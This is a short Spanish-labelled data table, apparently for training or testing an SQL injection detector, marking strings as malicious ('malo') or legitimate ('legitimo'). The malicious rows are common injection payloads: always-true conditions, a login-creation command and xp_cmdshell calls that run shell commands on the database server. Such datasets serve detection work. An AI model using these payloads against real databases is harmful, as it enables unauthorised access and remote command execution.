consulta_sql|tipo
' or 1=1 --|malo
1' or '1'='1|malo
a' or 1=1; --|malo
'any 'x'='x'|malo
1 or 1=1|malo
exec sp_addlogin 'name' , 'password'|malo
'; exec master..xp_cmdshell 'ping 10.10.1.2'--|malo
'; exec master..xp_cmdshell 'ping aaa.bbb.ccc.ddd'--|malo
A|legitimo
Buscando a memo|legitimo
ANALYZE lockdemo|legitimo
select * from employees|legitimo